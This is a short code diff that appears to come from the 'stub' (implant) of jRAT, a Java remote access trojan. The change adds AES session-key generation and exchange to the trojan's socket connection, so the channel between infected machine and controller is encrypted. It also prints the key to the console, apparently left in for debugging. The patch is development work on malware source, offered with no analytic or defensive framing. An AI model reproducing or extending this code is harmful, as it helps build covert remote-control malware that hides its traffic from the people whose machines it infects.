@@ -4,6 +4,7 @@ import io.jrat.common.OperatingSystem;
 import io.jrat.common.Version;
 import io.jrat.common.codec.Hex;
 import io.jrat.common.crypto.Crypto;
+import io.jrat.common.crypto.KeyExchanger;
 import io.jrat.common.io.StringWriter;
 import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
@@ -39,6 +40,8 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.util.Locale;
 
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
 
 import com.sun.management.OperatingSystemMXBean;
 
@@ -77,7 +80,18 @@ public class Connection implements Runnable {
 
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
-
+						
+			KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+	        keyGen.init(128);
+	        SecretKey secretKey = keyGen.generateKey();
+	        
+			KeyExchanger exchanger = new KeyExchanger(dis, dos);
+			exchanger.writeAESKey(secretKey);
+			
+			Main.encryptionKey = secretKey.getEncoded();
+			
+			System.out.println(Hex.encode(secretKey.getEncoded()));
+			
 			Main.encryption = inputStream.read() == 1;
 
 			addToSendQueue(new Packet1InitHandshake());
